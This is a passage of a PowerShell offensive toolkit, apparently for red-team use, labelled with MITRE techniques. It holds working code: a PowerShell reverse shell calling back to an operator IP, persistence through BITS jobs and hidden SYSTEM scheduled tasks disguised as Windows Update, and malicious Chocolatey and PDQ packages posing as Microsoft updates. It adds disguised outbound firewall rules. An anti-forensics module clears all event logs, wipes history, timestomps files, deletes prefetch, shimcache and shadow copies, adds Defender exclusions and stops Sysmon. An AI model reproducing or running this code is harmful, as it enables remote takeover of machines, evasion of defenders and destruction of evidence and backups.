    $fwRuleName = "Windows Network Diagnostics (TCP-Out)"
    if (-not (Get-NetFirewallRule -DisplayName $fwRuleName -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName $fwRuleName -Direction Outbound -Protocol TCP `
            -RemoteAddress $WTS_IP -RemotePort $WTS_Port -Action Allow -Profile Any -Enabled True | Out-Null
        Write-Success "Outbound FW rule added"
    }

    try {
        Start-Service -Name $ServiceName -ErrorAction Stop
        Write-Success "$ServiceName started"
    } catch {
        Write-Warn "Start-Service failed — trying sc.exe start..."
        & sc.exe start $ServiceName 2>&1 | Out-Null
    }
    Start-Sleep -Seconds 2
    $svcStatus = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($svcStatus -and $svcStatus.Status -eq "Running") { Write-Success "$ServiceName is RUNNING" }
    else { Write-Warn "$ServiceName status: $($svcStatus.Status)" }

    Write-Host ""
    Write-Info "Trigger: send UDP packet with magic bytes 0xDE 0xAD 0xBE 0xEF to any port"
    Write-Info "python3 -c `"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'\xde\xad\xbe\xef'+(b'A'*32),('<TARGET_IP>',9999))`""
    Write-Info "Then listen: nc -lvnp $WTS_Port"
}

# =============================================================================
# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 3 — BackgroundBeef  (T1197)
# ═══════════════════════════════════════════════════════════════════════════════
# =============================================================================

function Invoke-BackgroundBeef {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
    Write-Host "   BackgroundBeef -- T1197 BITS Jobs (fire-and-forget)" -ForegroundColor Yellow
    Write-Host "   Script exits. Windows carries the beef from here."   -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
    Write-Host ""

    $BB_IP    = $script:RedTeamIP
    $BB_Port  = $script:BackgroundBeef_Port
    $BB_C2    = if ($script:BackgroundBeef_C2) { $script:BackgroundBeef_C2 } else { "http://${BB_IP}:8080/wu-telemetry.ps1" }

    $JobName      = "WindowsUpdateTelemetry"
    $DropDir      = "C:\Windows\System32\spool\drivers\color"
    $LocalPayload = "$DropDir\wu-cache.ps1"
    $BitsDest     = "$DropDir\wu-telemetry.ps1"
    $NotifyScript = "$DropDir\wu-notify.ps1"
    $TaskPath     = "\Microsoft\Windows\WindowsUpdate\"
    $TaskName     = "USOSessionWorker"
    $bitsadmin    = "$env:SystemRoot\System32\bitsadmin.exe"

    Write-Section "BackgroundBeef 1/6  OS & BITS Check"
    if (-not (Test-Path $bitsadmin)) { throw "bitsadmin.exe not found" }
    $bitsSvc = Get-Service -Name BITS -ErrorAction SilentlyContinue
    if (-not $bitsSvc) { throw "BITS service not found" }
    if ($bitsSvc.Status -ne "Running") {
        Start-Service -Name BITS -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Write-Success "BITS service: $((Get-Service BITS).Status)"

    Write-Section "BackgroundBeef 2/6  Drop Directory & Payload Files"
    if (-not (Test-Path $DropDir)) { New-Item -ItemType Directory -Path $DropDir -Force | Out-Null }

    $RawShell = @"
`$c=New-Object Net.Sockets.TCPClient('$BB_IP',$BB_Port);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$sb=[Text.Encoding]::ASCII.GetBytes(`$r);`$s.Write(`$sb,0,`$sb.Length)};`$c.Close()
"@
    $EncodedShell = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RawShell))

    Set-Content -Path $LocalPayload -Value $RawShell -Encoding ASCII -Force
    Copy-Item -Path $LocalPayload -Destination $BitsDest -Force
    Write-Success "Fallback payload written: $LocalPayload"

    $NotifyContent = @"
Set-StrictMode -Version Latest
`$ErrorActionPreference = 'SilentlyContinue'
`$DropDir      = '$DropDir'
`$BitsDest     = '$BitsDest'
`$LocalPayload = '$LocalPayload'
`$JobName      = '$JobName'
`$C2Url        = '$BB_C2'
`$completedGuid = `$env:BitsJobId
if (`$completedGuid) { & bitsadmin /complete `$completedGuid 2>`$null | Out-Null }
`$target = if ((Test-Path `$BitsDest) -and ((Get-Item `$BitsDest).Length -gt 10)) { `$BitsDest } else { `$LocalPayload }
if (Test-Path `$target) { Start-Process -FilePath 'powershell.exe' -ArgumentList "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $EncodedShell" -WindowStyle Hidden -ErrorAction SilentlyContinue }
Start-Sleep -Seconds 3
`$existingJobs = & bitsadmin /list /allusers 2>`$null
`$existingJobs | Select-String -Pattern '$JobName' | ForEach-Object { `$guid = (`$_ -split '\s+' | Where-Object { `$_ -match '^\{' } | Select-Object -First 1); if (`$guid) { & bitsadmin /cancel `$guid 2>`$null | Out-Null } }
`$createOut = & bitsadmin /create /download '$JobName' 2>`$null
`$guid = (`$createOut | Select-String -Pattern '\{[0-9A-Fa-f-]+\}').Matches.Value
if (`$guid) {
    & bitsadmin /addfile `$guid '$BB_C2' '$BitsDest' | Out-Null
    & bitsadmin /SetPriority `$guid FOREGROUND | Out-Null
    & bitsadmin /SetMinRetryDelay `$guid 900 | Out-Null
    & bitsadmin /SetNoProgressTimeout `$guid 7776000 | Out-Null
    & bitsadmin /SetNotifyFlags `$guid 3 | Out-Null
    & bitsadmin /SetNotifyCmdLine `$guid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "$NotifyScript"' | Out-Null
    & bitsadmin /resume `$guid | Out-Null
}
"@
    Set-Content -Path $NotifyScript -Value $NotifyContent -Encoding ASCII -Force
    foreach ($f in @($LocalPayload, $BitsDest, $NotifyScript)) {
        try { attrib +H +S $f 2>$null } catch {}
        try { & icacls $f /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1 | Out-Null; & icacls $f /deny "BUILTIN\Users:(RX)" 2>&1 | Out-Null } catch {}
    }
    Write-Success "Payload files written, hidden, and ACL-hardened"

    Write-Section "BackgroundBeef 3/6  BITS Job Registration"
    $listOut = & $bitsadmin /list /allusers 2>$null
    if ($listOut -match [regex]::Escape($JobName)) {
        $listOut | Select-String -Pattern '\{[0-9A-Fa-f-]+\}' | ForEach-Object {
            $g = $_.Matches.Value
            if ((& $bitsadmin /info $g /verbose 2>$null) -match [regex]::Escape($JobName)) {
                & $bitsadmin /cancel $g 2>$null | Out-Null
            }
        }
        Start-Sleep -Seconds 1
    }

    $createOutput = & $bitsadmin /create /download $JobName 2>&1
    $jobGuid = ($createOutput | Select-String -Pattern '\{[0-9A-Fa-f-]+\}').Matches.Value
    if (-not $jobGuid) { throw "Failed to get BITS job GUID: $createOutput" }
    Write-Success "BITS job created: $jobGuid"

    & $bitsadmin /addfile              $jobGuid $BB_C2  $BitsDest 2>&1 | Out-Null
    & $bitsadmin /SetPriority          $jobGuid FOREGROUND         2>&1 | Out-Null
    & $bitsadmin /SetMinRetryDelay     $jobGuid 900                2>&1 | Out-Null
    & $bitsadmin /SetNoProgressTimeout $jobGuid 7776000            2>&1 | Out-Null
    & $bitsadmin /SetNotifyFlags       $jobGuid 3                  2>&1 | Out-Null
    $notifyArgs = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$NotifyScript`""
    & $bitsadmin /SetNotifyCmdLine $jobGuid "powershell.exe" $notifyArgs 2>&1 | Out-Null
    & $bitsadmin /resume           $jobGuid 2>&1 | Out-Null
    Write-Success "BITS job armed and resumed"

    Write-Section "BackgroundBeef 4/6  Backup Scheduled Task"
    Unregister-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    try {
        $action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$NotifyScript`""
        $t1 = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).AddMinutes(5)
        $t1.Repetition.StopAtDurationEnd = $false
        $t2 = New-ScheduledTaskTrigger -AtLogOn
        $t3 = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1) -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 5) -StartWhenAvailable
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName `
            -InputObject (New-ScheduledTask -Action $action -Trigger @($t1,$t2,$t3) -Settings $settings -Principal $principal -Description "Manages the Windows Update Session Orchestration background worker process.") `
            -Force | Out-Null
        Write-Success "Backup task registered: ${TaskPath}${TaskName}"
    } catch { Write-Warn "Backup task failed: $_ — BITS is still primary persistence" }

    Write-Section "BackgroundBeef 5/6  Firewall"
    if (-not (Get-NetFirewallRule -DisplayName "Windows Update Health Check (TCP-Out)" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Windows Update Health Check (TCP-Out)" -Direction Outbound -Protocol TCP -RemoteAddress $BB_IP -RemotePort $BB_Port -Action Allow -Profile Any -Enabled True | Out-Null
        Write-Success "Outbound allow: ${BB_IP}:${BB_Port}"
    }
    if (-not (Get-NetFirewallRule -DisplayName "Windows Update Service Agent (HTTP-Out)" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Windows Update Service Agent (HTTP-Out)" -Direction Outbound -Protocol TCP -RemoteAddress $BB_IP -RemotePort 8080 -Action Allow -Profile Any -Enabled True | Out-Null
        Write-Success "Outbound allow: ${BB_IP}:8080 (BITS download)"
    }

    Write-Section "BackgroundBeef 6/6  Verification"
    Write-Info "Current BITS jobs:"
    & $bitsadmin /list /allusers 2>$null | ForEach-Object { Write-Host "    $_" -ForegroundColor Gray }
    Write-Host ""
    Write-Info "nc -lvnp $BB_Port"
    Write-Success "BackgroundBeef deployed. BITS owns it now."
}

# =============================================================================
# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 4 — ChocolateFactory  (T1072)
# ═══════════════════════════════════════════════════════════════════════════════
# =============================================================================

function Invoke-ChocolateFactory {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkYellow
    Write-Host "   ChocolateFactory -- T1072 Software Deployment Tools" -ForegroundColor Yellow
    Write-Host "   Every upgrade cycle delivers your payload."          -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor DarkYellow
    Write-Host ""

    $CF_IP    = $script:RedTeamIP
    $CF_Port  = $script:ChocolateFactory_Port

    $PkgSourceDir  = "C:\Windows\System32\spool\drivers\color\pkgs"
    $PkgSourceName = "WinCorpUpdates"
    $PkgId         = "windows-telemetry-core"
    $PkgVersion    = "3.2.1"
    $PkgTitle      = "Windows Telemetry Core Components"
    $PkgAuthors    = "Microsoft Corporation"
    $PkgDesc       = "Core telemetry and diagnostic components for Windows quality improvement"
    $TaskPath      = "\Microsoft\Windows\WindowsUpdate\"
    $TaskName      = "ChocolateyMaintenance"
    $ChocoInstallUrl = "https://community.chocolatey.org/install.ps1"

    # ── Section 1: Chocolatey Install / Hijack ────────────────────────────────
    Write-Section "ChocolateFactory 1/5  Chocolatey Install / Hijack"
    $chocoPath = $null
    foreach ($c in @("$env:ProgramData\chocolatey\bin\choco.exe","C:\ProgramData\chocolatey\bin\choco.exe")) {
        if (Test-Path $c) { $chocoPath = $c; break }
    }
    if (-not $chocoPath) {
        $ci = Get-Command choco -ErrorAction SilentlyContinue
        if ($ci) { $chocoPath = $ci.Source }
    }
    if ($chocoPath) {
        Write-Warn "Chocolatey already installed — hijacking: $chocoPath"
    } else {
        Write-Info "Installing Chocolatey silently..."
        try {
            $env:chocolateyUseWindowsCompression = 'true'
            Set-ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            Invoke-Expression ((New-Object System.Net.WebClient).DownloadString($ChocoInstallUrl)) 2>&1 | Out-Null
            foreach ($c in @("$env:ProgramData\chocolatey\bin\choco.exe","C:\ProgramData\chocolatey\bin\choco.exe")) {
                if (Test-Path $c) { $chocoPath = $c; break }
            }
            if (-not $chocoPath) { $chocoPath = "choco" }
        } catch { Write-Warn "Chocolatey install failed: $_ — trying 'choco' from PATH"; $chocoPath = "choco" }
    }
    Write-Success "Chocolatey ready: $chocoPath"

    # ── Section 2: Rogue Package Source ───────────────────────────────────────
    Write-Section "ChocolateFactory 2/5  Rogue Package Source"
    if (-not (Test-Path $PkgSourceDir)) { New-Item -ItemType Directory -Path $PkgSourceDir -Force | Out-Null }
    try { attrib +H +S $PkgSourceDir 2>$null; & icacls $PkgSourceDir /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)(F)" 2>&1 | Out-Null; & icacls $PkgSourceDir /grant:r "BUILTIN\Administrators:(OI)(CI)(F)" 2>&1 | Out-Null } catch {}
    try {
        & $chocoPath source remove --name="$PkgSourceName" 2>&1 | Out-Null
        & $chocoPath source add --name="$PkgSourceName" --source="$PkgSourceDir" --priority=0 2>&1 | Out-Null
        Write-Success "Source registered: '$PkgSourceName' → $PkgSourceDir (priority 0)"
    } catch { Write-Warn "choco source add failed: $_" }

    # ── Section 3: Build .nupkg ───────────────────────────────────────────────
    Write-Section "ChocolateFactory 3/5  Building Malicious .nupkg"
    $RawShell = @"
`$c=New-Object Net.Sockets.TCPClient('$CF_IP',$CF_Port);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$sb=[Text.Encoding]::ASCII.GetBytes(`$r);`$s.Write(`$sb,0,`$sb.Length)};`$c.Close()
"@
    $EncodedShell = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RawShell))

    $InstallScript = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$encoded = '$EncodedShell'
Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -Enc `$encoded" -WindowStyle Hidden -ErrorAction SilentlyContinue
try { Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics' -Name 'TelemetryCoreVersion' -Value '$PkgVersion' -Type String -Force 2>`$null } catch {}
Write-Host "Windows Telemetry Core Components installed successfully."
"@

    $NuspecXml = @"
<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2015/06/nuspec.xsd">
  <metadata><id>$PkgId</id><version>$PkgVersion</version><title>$PkgTitle</title>
  <authors>$PkgAuthors</authors><owners>$PkgAuthors</owners><description>$PkgDesc</description>
  <requireLicenseAcceptance>false</requireLicenseAcceptance></metadata>
</package>
"@
    $ContentTypesXml = '<?xml version="1.0" encoding="utf-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="nuspec" ContentType="application/octet"/><Default Extension="ps1" ContentType="application/octet"/></Types>'
    $RelsXml = "<?xml version=`"1.0`" encoding=`"utf-8`"?><Relationships xmlns=`"http://schemas.openxmlformats.org/package/2006/relationships`"><Relationship Type=`"http://schemas.microsoft.com/packaging/2010/07/manifest`" Target=`"/$PkgId.nuspec`" Id=`"R1`"/></Relationships>"

    Add-Type -Assembly System.IO.Compression
    Add-Type -Assembly System.IO.Compression.FileSystem
    $nupkgPath  = "$PkgSourceDir\$PkgId.$PkgVersion.nupkg"
    $tempPkgDir = "$env:TEMP\chocobuild_$PID"
    try {
        New-Item -ItemType Directory -Path "$tempPkgDir\_rels" -Force | Out-Null
        New-Item -ItemType Directory -Path "$tempPkgDir\tools"  -Force | Out-Null
        [System.IO.File]::WriteAllText("$tempPkgDir\[Content_Types].xml",            $ContentTypesXml, [Text.Encoding]::UTF8)
        [System.IO.File]::WriteAllText("$tempPkgDir\_rels\.rels",                    $RelsXml,         [Text.Encoding]::UTF8)
        [System.IO.File]::WriteAllText("$tempPkgDir\$PkgId.nuspec",                  $NuspecXml,       [Text.Encoding]::UTF8)
        [System.IO.File]::WriteAllText("$tempPkgDir\tools\chocolateyInstall.ps1",    $InstallScript,   [Text.Encoding]::UTF8)
        if (Test-Path $nupkgPath) { Remove-Item $nupkgPath -Force }
        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempPkgDir, $nupkgPath)
        Write-Success ".nupkg built: $nupkgPath ($([math]::Round((Get-Item $nupkgPath).Length/1KB,1)) KB)"
    } catch { Write-Err "Failed to build .nupkg: $_" }
    finally { Remove-Item $tempPkgDir -Recurse -Force -ErrorAction SilentlyContinue }

    # ── Section 4: Self-Healing Scheduled Task ────────────────────────────────
    Write-Section "ChocolateFactory 4/5  Self-Healing Scheduled Task"
    Unregister-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    try {
        $upgradeCmd = "choco upgrade $PkgId --source=`"$PkgSourceDir`" -y --force --no-progress 2>&1 | Out-Null"
        $action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"$upgradeCmd`""
        $t1 = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).AddMinutes(1)
        $t1.Repetition.StopAtDurationEnd = $false
        $t2 = New-ScheduledTaskTrigger -AtStartup; $t3 = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 5) -StartWhenAvailable
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName `
            -InputObject (New-ScheduledTask -Action $action -Trigger @($t1,$t2,$t3) -Settings $settings -Principal $principal -Description "Chocolatey package maintenance and update service for Windows core components") `
            -Force | Out-Null
        Write-Success "Task registered: ${TaskPath}${TaskName} (every 30 min + startup + logon)"
    } catch { Write-Err "Scheduled task failed: $_" }

    # ── Section 5: PDQ Deploy Hook (opportunistic) ────────────────────────────
    Write-Section "ChocolateFactory 5/5  PDQ Deploy Hook"
    $pdqFound = $false
    foreach ($p in @("C:\Program Files (x86)\Admin Arsenal\PDQ Deploy","C:\Program Files\Admin Arsenal\PDQ Deploy","${env:ProgramFiles(x86)}\Admin Arsenal\PDQ Deploy","$env:ProgramFiles\Admin Arsenal\PDQ Deploy")) {
        if (Test-Path $p) { $pdqFound = $true; Write-Warn "PDQ Deploy found: $p"; break }
    }
    if ($pdqFound) {
        $pdqPkgDir = "C:\ProgramData\Admin Arsenal\PDQ Deploy\Packages"
        if (-not (Test-Path $pdqPkgDir)) { New-Item -ItemType Directory -Path $pdqPkgDir -Force -ErrorAction SilentlyContinue | Out-Null }
        $pdqPackage = @"
<?xml version="1.0"?><Package Version="19" Name="Windows Security Update KB5031354" Description="Critical security update" ErrorMode="0" Timeout="600" RunAs="LocalSystem"><Steps><Step Type="PowerShell" Name="Apply Update" RunAs="LocalSystem"><Command>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $EncodedShell</Command></Step></Steps></Package>
"@
        try {
            $pdqPkgPath = "$pdqPkgDir\WinSecUpdate-KB5031354.pdq"
            [System.IO.File]::WriteAllText($pdqPkgPath, $pdqPackage, [Text.Encoding]::UTF8)
            attrib +H "$pdqPkgPath" 2>$null
            Write-Success "PDQ package dropped: $pdqPkgPath"
        } catch { Write-Warn "PDQ drop failed: $_" }
    } else {
        Write-Info "PDQ Deploy not found — skipping PDQ hook"
    }

    # ── Initial Install Run ───────────────────────────────────────────────────
    Write-Info "Running initial choco install to fire payload..."
    try {
        $out = & $chocoPath install $PkgId --source="$PkgSourceDir" -y --force --no-progress 2>&1 | Out-String
        Write-Info "Install output: $($out.Trim() -replace '\n',' ')"
    } catch { Write-Warn "Initial install failed: $_ — task retries in 30 min" }

    Write-Host ""
    Write-Info "nc -lvnp $CF_Port"
    Write-Info "choco list --source=`"$PkgSourceDir`" --local-only"
    Write-Success "ChocolateFactory deployed!"
}

# =============================================================================
# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 5 — MemoryHole  (T1070)  — ALWAYS RUNS LAST
# ═══════════════════════════════════════════════════════════════════════════════
# =============================================================================

function Invoke-MemoryHole {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkCyan
    Write-Host "   MemoryHole -- T1070 Anti-Forensics" -ForegroundColor Yellow
    Write-Host "   The evidence was here. Now it isn't."  -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor DarkCyan
    Write-Host ""

    if ($script:MemoryHole_Pass -eq "CHANGEME") {
        throw "MemoryHole_Pass is still CHANGEME in Operator Config — refusing to run"
    }

    # ── Phase B: Process Masquerade ───────────────────────────────────────────
    Write-Section "B/K  Process Masquerade"
    try { $Host.UI.RawUI.WindowTitle = "Windows Update Agent"; Write-Success "Window title → 'Windows Update Agent'" } catch {}

    # Reference timestamp (from ntdll.dll)
    $refFile = "C:\Windows\System32\ntdll.dll"
    try { $script:_RefTime = (Get-Item $refFile -ErrorAction Stop).LastWriteTime }
    catch { $script:_RefTime = [datetime]"2019-03-19 03:44:22"; Write-Warn "Using fallback reference timestamp" }

    function _Stomp-File { param([string]$Path); if (-not (Test-Path $Path -PathType Leaf)) { return }; try { [System.IO.File]::SetCreationTime($Path,$script:_RefTime); [System.IO.File]::SetLastWriteTime($Path,$script:_RefTime); [System.IO.File]::SetLastAccessTime($Path,$script:_RefTime) } catch {} }
    function _Stomp-Dir {
        param([string]$Dir); if (-not (Test-Path $Dir -PathType Container)) { return }
        try {
            Get-ChildItem -Recurse -Force $Dir -ErrorAction SilentlyContinue | ForEach-Object {
                try { if (-not $_.PSIsContainer) { [System.IO.File]::SetCreationTime($_.FullName,$script:_RefTime); [System.IO.File]::SetLastWriteTime($_.FullName,$script:_RefTime); [System.IO.File]::SetLastAccessTime($_.FullName,$script:_RefTime) } else { [System.IO.Directory]::SetCreationTime($_.FullName,$script:_RefTime); [System.IO.Directory]::SetLastWriteTime($_.FullName,$script:_RefTime); [System.IO.Directory]::SetLastAccessTime($_.FullName,$script:_RefTime) } } catch {}
            }
            [System.IO.Directory]::SetCreationTime($Dir,$script:_RefTime); [System.IO.Directory]::SetLastWriteTime($Dir,$script:_RefTime); [System.IO.Directory]::SetLastAccessTime($Dir,$script:_RefTime)
        } catch {}
    }
    function _Remove-Secure {
        param([string]$Path); if (-not (Test-Path $Path -PathType Leaf)) { return }
        try {
            $len = (Get-Item $Path -ErrorAction SilentlyContinue).Length
            if ($len -and $len -gt 0) { $buf = [byte[]]::new($len); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($buf); [System.IO.File]::WriteAllBytes($Path, $buf) }
            Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
        } catch { Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue }
    }

    # ── Phase C: Event Log Clearing ───────────────────────────────────────────
    Write-Section "C/K  Event Log Clearing"
    $_logCount = 0; $_logFailed = 0
    try {
        $logList = & wevtutil.exe el 2>$null
        if ($logList -is [string]) { $logList = @($logList) }
        foreach ($logName in $logList) {
            $logName = $logName.Trim(); if (-not $logName) { continue }
            try { & wevtutil.exe cl "$logName" 2>$null | Out-Null; $_logCount++ } catch { $_logFailed++ }
        }
    } catch {
        foreach ($logName in @("Security","System","Application","Windows PowerShell","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-Sysmon/Operational","Microsoft-Windows-Windows Defender/Operational","Microsoft-Windows-TaskScheduler/Operational","Microsoft-Windows-WMI-Activity/Operational","Microsoft-Windows-Bits-Client/Operational")) {
            try { & wevtutil.exe cl "$logName" 2>$null | Out-Null; $_logCount++ } catch { $_logFailed++ }
        }
    }
    Write-Success "Event logs cleared: $_logCount channels  (failed: $_logFailed)"

    # ── Phase D: PS History Wipe ──────────────────────────────────────────────
    Write-Section "D/K  Command History Wipe"
    $_histCount = 0
    try {
        Get-ChildItem -Path "C:\Users" -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $h = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
            if (Test-Path $h) { try { Remove-Item -Path $h -Force -ErrorAction SilentlyContinue; $_histCount++ } catch {} }
        }
    } catch {}
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() | Out-Null } catch {}
    try { Clear-History -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue } catch {}
    Write-Success "History wiped: $_histCount profiles + Recent items"

    # ── Phase E: Timestomping ─────────────────────────────────────────────────
    Write-Section "E/K  Timestomping Phase 2 Artifacts"
    Write-Info "Reference: $($script:_RefTime)"
    _Stomp-File "C:\Windows\System32\wbem\wbemperf.ps1"
    _Stomp-File "C:\Windows\System32\ndisflt.exe"
    _Stomp-File "C:\Windows\System32\spool\drivers\color\wu-cache.ps1"
    _Stomp-File "C:\Windows\System32\spool\drivers\color\wu-telemetry.ps1"
    _Stomp-File "C:\Windows\System32\spool\drivers\color\wu-notify.ps1"
    _Stomp-File "C:\Windows\System32\spool\drivers\color\winsat-media.ps1"
    _Stomp-Dir  "C:\Windows\System32\spool\drivers\color\pkgs"
    _Stomp-Dir  "C:\ProgramData\chocolatey"
    _Stomp-Dir  "C:\Windows\System32\spool\drivers\color"
    Write-Success "Timestomping complete — artifacts now appear $($script:_RefTime.Year)-era"

    # ── Phase F: Prefetch Deletion ────────────────────────────────────────────
    Write-Section "F/K  Prefetch Deletion"
    $_pfCount = 0
    try {
        Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*.pf" -Force -ErrorAction SilentlyContinue |
            ForEach-Object { try { Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue; $_pfCount++ } catch {} }
    } catch {}
    Write-Success "Prefetch deleted: $_pfCount files"

    # ── Phase G: Shimcache Wipe ───────────────────────────────────────────────
    Write-Section "G/K  Shimcache Wipe"
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Name "AppCompatCache" -ErrorAction Stop
        Write-Success "AppCompatCache removed (takes effect on reboot)"
    } catch { Write-Warn "Shimcache wipe failed: $_" }

    # ── Phase H: Shadow Copies ────────────────────────────────────────────────
    Write-Section "H/K  Shadow Copy Deletion"
    try { $r = & vssadmin.exe delete shadows /all /quiet 2>&1; if ($LASTEXITCODE -eq 0) { Write-Success "vssadmin: shadows deleted" } else { throw "exit $LASTEXITCODE" } }
    catch { try { & wmic shadowcopy delete 2>$null | Out-Null; Write-Success "Shadow copies deleted (wmic)" } catch { Write-Warn "Shadow copy deletion failed" } }

    # ── Phase I: Defender Exclusions + Sysmon ────────────────────────────────
    Write-Section "I/K  Defender Exclusions + Sysmon"
    $_exclCount = 0
    foreach ($p in @("C:\Windows\System32\spool\drivers\color","C:\Windows\System32\ndisflt.exe","C:\ProgramData\chocolatey","C:\Windows\System32\spool\drivers\color\pkgs")) {
        try { Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; $_exclCount++ } catch {}
    }
    Write-Success "Defender exclusions added: $_exclCount paths"
    try {
        $sysmonSvc = Get-Service -Name "Sysmon*" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($sysmonSvc) {
            Stop-Service -Name $sysmonSvc.Name -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
            & wevtutil.exe cl "Microsoft-Windows-Sysmon/Operational" 2>$null | Out-Null
            Write-Success "Sysmon stopped + operational log cleared"
        }
    } catch {}

    # ── Phase J: Registry Cleanup ─────────────────────────────────────────────
    Write-Section "J/K  Registry Cleanup"
    foreach ($k in @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs","HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU","HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths","HKCU:\Software\Microsoft\Internet Explorer\TypedURLs")) {
        try { if (Test-Path $k) { Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue } } catch {}
    }
    try { $np = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\WbemPerfMon"; if (Test-Path $np) { Remove-Item -Path $np -Recurse -Force; Write-Success "WhoAmIAnyway Winlogon Notify key removed" } } catch {}
